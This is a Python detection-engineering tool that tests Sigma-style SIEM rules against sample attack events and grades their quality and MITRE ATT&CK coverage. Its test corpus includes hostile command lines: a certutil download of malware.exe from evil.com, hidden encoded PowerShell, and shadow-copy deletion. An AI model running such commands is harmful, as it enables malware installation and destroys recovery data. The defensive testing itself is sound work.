"""
SIEM Detection Rule Validator — Rule Quality & Coverage Analyzer
================================================================
Tests Sigma-style detection rules against known attack patterns,
measures rule quality (coverage, false-positive risk, performance),
and identifies gaps in detection coverage mapped to MITRE ATT&CK.

This is what separates Detection Engineers from alert-watchers.
Writing rules is easy. Writing GOOD rules that catch attacks without
flooding analysts with noise is the actual skill.

MITRE ATT&CK: Full framework coverage via rule gap analysis.

Author: Oladapo Damilola (Wizardskull)
"""

import json
import re
import sys
from collections import defaultdict
from datetime import datetime, timezone


# ── Sigma-compatible Rule Schema ──────────────────────────────────────────────
# Simplified subset: title, description, mitre, logsource, detection, condition
SAMPLE_RULES = [
    {
        "rule_id": "SOC-001",
        "title": "Suspicious PowerShell Encoded Command",
        "description": "Detects PowerShell executing base64-encoded commands",
        "mitre_technique": "T1059.001",
        "mitre_tactic": "Execution",
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": {
            "selection": {
                "process_name|endswith": "powershell.exe",
                "command_line|contains|any": ["-enc", "-encodedcommand", "-EncodedCommand"],
            }
        },
        "condition": "selection",
        "false_positive_risk": "medium",
        "severity": "HIGH",
    },
    {
        "rule_id": "SOC-002",
        "title": "Certutil File Download",
        "description": "Detects certutil used to download files from the internet",
        "mitre_technique": "T1140",
        "mitre_tactic": "Defense Evasion",
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": {
            "selection": {
                "process_name|endswith": "certutil.exe",
                "command_line|contains|all": ["-urlcache", "http"],
            }
        },
        "condition": "selection",
        "false_positive_risk": "low",
        "severity": "HIGH",
    },
    {
        "rule_id": "SOC-003",
        "title": "Shadow Copy Deletion",
        "description": "Detects deletion of volume shadow copies (ransomware indicator)",
        "mitre_technique": "T1490",
        "mitre_tactic": "Impact",
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": {
            "selection_vss": {
                "process_name|endswith": "vssadmin.exe",
                "command_line|contains": "delete",
            },
            "selection_wmic": {
                "process_name|endswith": "wmic.exe",
                "command_line|contains|all": ["shadowcopy", "delete"],
            },
        },
        "condition": "selection_vss or selection_wmic",
        "false_positive_risk": "very_low",
        "severity": "CRITICAL",
    },
    {
        "rule_id": "SOC-004",
        "title": "Net.exe Domain Admin Enumeration",
        "description": "Detects enumeration of Domain Admins group",
        "mitre_technique": "T1087.002",
        "mitre_tactic": "Discovery",
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": {
            "selection": {
                "process_name|endswith": "net.exe",
                "command_line|contains|any": ["domain admins", "administrateurs du domaine"],
            }
        },
        "condition": "selection",
        "false_positive_risk": "low",
        "severity": "MEDIUM",
    },
    {
        "rule_id": "SOC-005",
        "title": "OVERLY BROAD - Any CMD Execution",  # deliberately bad rule
        "description": "Detects any cmd.exe execution — will generate massive FPs",
        "mitre_technique": "T1059.003",
        "mitre_tactic": "Execution",
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": {
            "selection": {
                "process_name|endswith": "cmd.exe",
            }
        },
        "condition": "selection",
        "false_positive_risk": "very_high",
        "severity": "LOW",
    },
    {
        "rule_id": "SOC-006",
        "title": "DUPLICATE CHECK - PowerShell Download (near-dup of SOC-001)",
        "description": "Detects PowerShell downloading content — partially overlaps SOC-001",
        "mitre_technique": "T1059.001",
        "mitre_tactic": "Execution",
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": {
            "selection": {
                "process_name|endswith": "powershell.exe",
                "command_line|contains|any": ["-enc", "DownloadString", "WebClient"],
            }
        },
        "condition": "selection",
        "false_positive_risk": "medium",
        "severity": "HIGH",
    },
]

# ── Known Attack Patterns (test corpus) ───────────────────────────────────────
ATTACK_TEST_CASES = [
    # True positives — rules SHOULD fire
    {"id": "TP-001", "label": "Cobalt Strike PowerShell", "expected_rule": "SOC-001",
     "event": {"process_name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA=="}},
    {"id": "TP-002", "label": "Certutil download", "expected_rule": "SOC-002",
     "event": {"process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -f http://evil.com/malware.exe C:\\temp\\m.exe"}},
    {"id": "TP-003", "label": "VSS deletion (ransomware)", "expected_rule": "SOC-003",
     "event": {"process_name": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet"}},
    {"id": "TP-004", "label": "Domain admin enum", "expected_rule": "SOC-004",
     "event": {"process_name": "net.exe", "command_line": "net group \"domain admins\" /domain"}},
    {"id": "TP-005", "label": "WMIC shadow delete", "expected_rule": "SOC-003",
     "event": {"process_name": "wmic.exe", "command_line": "wmic shadowcopy delete /nointeractive"}},

    # True negatives — rules should NOT fire
    {"id": "TN-001", "label": "Normal PowerShell execution", "expected_rule": None,
     "event": {"process_name": "powershell.exe", "command_line": "powershell.exe Get-Process"}},
    {"id": "TN-002", "label": "Certutil cert verification", "expected_rule": None,
     "event": {"process_name": "certutil.exe", "command_line": "certutil.exe -verify certificate.cer"}},
    {"id": "TN-003", "label": "Normal net use", "expected_rule": None,
     "event": {"process_name": "net.exe", "command_line": "net use Z: \\\\server\\share"}},

    # False positive generators
    {"id": "FP-001", "label": "IT admin using certutil locally", "expected_rule": None,
     "event": {"process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -f http://intranet.corp/cert.crl"}},
]

# ── MITRE Coverage Matrix ─────────────────────────────────────────────────────
MITRE_CRITICAL_TECHNIQUES = {
    "T1059.001": "PowerShell",
    "T1059.003": "Windows Command Shell",
    "T1003.001": "LSASS Memory Dump",
    "T1055": "Process Injection",
    "T1071.001": "Web Protocols C2",
    "T1548.002": "UAC Bypass",
    "T1110.003": "Password Spray",
    "T1486": "Data Encrypted (Ransomware)",
    "T1490": "Inhibit Recovery",
    "T1078": "Valid Accounts",
    "T1021.002": "SMB Lateral Movement",
    "T1558.003": "Kerberoasting",
    "T1048": "Exfiltration Over Alt Protocol",
    "T1197": "BITS Jobs",
}


# ── Rule Engine ───────────────────────────────────────────────────────────────
def evaluate_condition(detection: dict, condition: str, event: dict) -> bool:
    """
    Simplified Sigma condition evaluator.
    Supports: field|endswith, field|contains, field|contains|any, field|contains|all
    """
    results = {}

    for sel_name, sel_fields in detection.items():
        match = True
        for field_expr, value in sel_fields.items():
            parts = field_expr.split("|")
            field = parts[0]
            modifiers = parts[1:] if len(parts) > 1 else []

            event_val = str(event.get(field, "")).lower()

            if "endswith" in modifiers:
                field_match = event_val.endswith(str(value).lower())
            elif "contains" in modifiers and "any" in modifiers:
                values = value if isinstance(value, list) else [value]
                field_match = any(str(v).lower() in event_val for v in values)
            elif "contains" in modifiers and "all" in modifiers:
                values = value if isinstance(value, list) else [value]
                field_match = all(str(v).lower() in event_val for v in values)
            elif "contains" in modifiers:
                field_match = str(value).lower() in event_val
            else:
                field_match = event_val == str(value).lower()

            if not field_match:
                match = False
                break
        results[sel_name] = match

    # Evaluate condition expression
    cond = condition.lower()
    for sel_name, result in results.items():
        cond = cond.replace(sel_name.lower(), str(result))
    try:
        return eval(cond)
    except Exception:
        return any(results.values())


def test_rule_against_corpus(rule: dict, test_cases: list) -> dict:
    """Run a rule against all test cases, measure TP/FP/FN/TN."""
    tp, fp, fn, tn = 0, 0, 0, 0
    failures = []

    for tc in test_cases:
        event = tc["event"]
        expected_fires = (tc.get("expected_rule") == rule["rule_id"])
        fired = evaluate_condition(rule["detection"], rule["condition"], event)

        if fired and expected_fires:
            tp += 1
        elif fired and not expected_fires:
            fp += 1
            failures.append({"case": tc["id"], "label": tc["label"], "type": "FP"})
        elif not fired and expected_fires:
            fn += 1
            failures.append({"case": tc["id"], "label": tc["label"], "type": "FN"})
        else:
            tn += 1

    total = tp + fp + fn + tn
    precision = tp / (tp + fp) if (tp + fp) > 0 else 1.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 1.0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0

    return {
        "tp": tp, "fp": fp, "fn": fn, "tn": tn,
        "precision": round(precision, 3),
        "recall": round(recall, 3),
        "f1_score": round(f1, 3),
        "failures": failures,
    }


def assess_rule_quality(rule: dict, test_result: dict) -> dict:
    """Score rule quality across multiple dimensions."""
    issues = []
    score = 100

    # 1. False positive risk declared
    fp_risk = rule.get("false_positive_risk", "unknown")
    if fp_risk in ("very_high", "high"):
        issues.append(f"HIGH false positive risk declared: '{fp_risk}'")
        score -= 25

    # 2. Actual FPs found in testing
    if test_result["fp"] > 0:
        issues.append(f"{test_result['fp']} false positive(s) in test corpus")
        score -= test_result["fp"] * 15

    # 3. Missing test coverage
    if test_result["tp"] == 0 and test_result["fn"] == 0:
        issues.append("No relevant test cases — coverage unknown")
        score -= 10

    # 4. Missed detections (FN)
    if test_result["fn"] > 0:
        issues.append(f"Missed {test_result['fn']} attack(s) in test corpus (false negatives)")
        score -= test_result["fn"] * 20

    # 5. No description
    if not rule.get("description"):
        issues.append("Missing rule description")
        score -= 5

    # 6. No MITRE mapping
    if not rule.get("mitre_technique"):
        issues.append("Missing MITRE ATT&CK technique mapping")
        score -= 10

    # 7. Overly simple detection (one-field, no modifiers)
    has_conditions = any("|" in k for fields in rule["detection"].values()
                         for k in fields.keys())
    if not has_conditions:
        issues.append("Single-field detection — high false positive risk")
        score -= 15

    grade = "A" if score >= 90 else "B" if score >= 75 else "C" if score >= 60 else "D" if score >= 40 else "F"
    return {"score": max(score, 0), "grade": grade, "issues": issues}


def find_coverage_gaps(rules: list) -> list:
    """Identify MITRE techniques not covered by any rule."""
    covered = {r.get("mitre_technique") for r in rules if r.get("mitre_technique")}
    gaps = []
    for tech, name in MITRE_CRITICAL_TECHNIQUES.items():
        if tech not in covered:
            gaps.append({"technique": tech, "name": name,
                         "recommendation": f"Create detection rule for {name} ({tech})"})
    return gaps


def find_duplicate_rules(rules: list) -> list:
    """Detect rules with overlapping MITRE techniques and similar conditions."""
    duplicates = []
    technique_groups = defaultdict(list)
    for rule in rules:
        tech = rule.get("mitre_technique", "")
        if tech:
            technique_groups[tech].append(rule)

    for tech, group in technique_groups.items():
        if len(group) > 1:
            duplicates.append({
                "technique": tech,
                "overlapping_rules": [r["rule_id"] for r in group],
                "recommendation": "Review and consolidate — overlapping rules waste analyst attention",
            })
    return duplicates


def run_validation(rules: list, test_cases: list) -> dict:
    rule_results = []
    for rule in rules:
        test_result = test_rule_against_corpus(rule, test_cases)
        quality = assess_rule_quality(rule, test_result)
        rule_results.append({
            "rule_id": rule["rule_id"],
            "title": rule["title"],
            "mitre_technique": rule.get("mitre_technique", ""),
            "severity": rule.get("severity", ""),
            "test_results": test_result,
            "quality": quality,
            "recommendation": "PASS" if quality["grade"] in ("A", "B") else
                             "REVIEW" if quality["grade"] == "C" else "REWRITE",
        })

    gaps = find_coverage_gaps(rules)
    duplicates = find_duplicate_rules(rules)
    avg_quality = sum(r["quality"]["score"] for r in rule_results) / len(rule_results) if rule_results else 0
    passing = sum(1 for r in rule_results if r["recommendation"] == "PASS")

    return {
        "validation_timestamp": datetime.now(timezone.utc).isoformat(),
        "total_rules": len(rules),
        "rules_passing": passing,
        "rules_needing_review": len(rule_results) - passing,
        "average_quality_score": round(avg_quality, 1),
        "coverage_gaps": gaps,
        "duplicate_rules": duplicates,
        "rule_results": rule_results,
    }


def print_report(result: dict):
    print("\n" + "═" * 70)
    print("  SIEM RULE VALIDATOR — DETECTION QUALITY REPORT")
    print("═" * 70)
    print(f"  Rules analyzed: {result['total_rules']}")
    print(f"  Passing (A/B): {result['rules_passing']} | Needs work: {result['rules_needing_review']}")
    print(f"  Average quality score: {result['average_quality_score']}/100")
    print(f"  Coverage gaps (critical MITRE): {len(result['coverage_gaps'])}")
    print(f"  Duplicate rule pairs: {len(result['duplicate_rules'])}")
    print()

    print("  RULE-BY-RULE RESULTS:")
    for r in result["rule_results"]:
        q = r["quality"]
        t = r["test_results"]
        print(f"  [{r['rule_id']}] Grade: {q['grade']} ({q['score']}/100) — {r['recommendation']}")
        print(f"      {r['title']}")
        print(f"      TP:{t['tp']} FP:{t['fp']} FN:{t['fn']} TN:{t['tn']} | F1:{t['f1_score']}")
        if q["issues"]:
            for issue in q["issues"]:
                print(f"      ⚠ {issue}")
        print()

    if result["coverage_gaps"]:
        print("  MITRE COVERAGE GAPS:")
        for gap in result["coverage_gaps"][:5]:
            print(f"  ❌ {gap['technique']} — {gap['name']}")
        print()

    if result["duplicate_rules"]:
        print("  DUPLICATE RULES:")
        for dup in result["duplicate_rules"]:
            print(f"  ⚠ {dup['technique']}: {', '.join(dup['overlapping_rules'])}")
    print("═" * 70)


def main():
    out_path = sys.argv[1] if len(sys.argv) > 1 else "rule_validation_report.json"
    print(f"[*] Validating {len(SAMPLE_RULES)} detection rules against {len(ATTACK_TEST_CASES)} test cases")
    result = run_validation(SAMPLE_RULES, ATTACK_TEST_CASES)
    print_report(result)
    with open(out_path, "w") as f:
        json.dump(result, f, indent=2)
    print(f"  📄 Report saved → {out_path}")


if __name__ == "__main__":
    main()
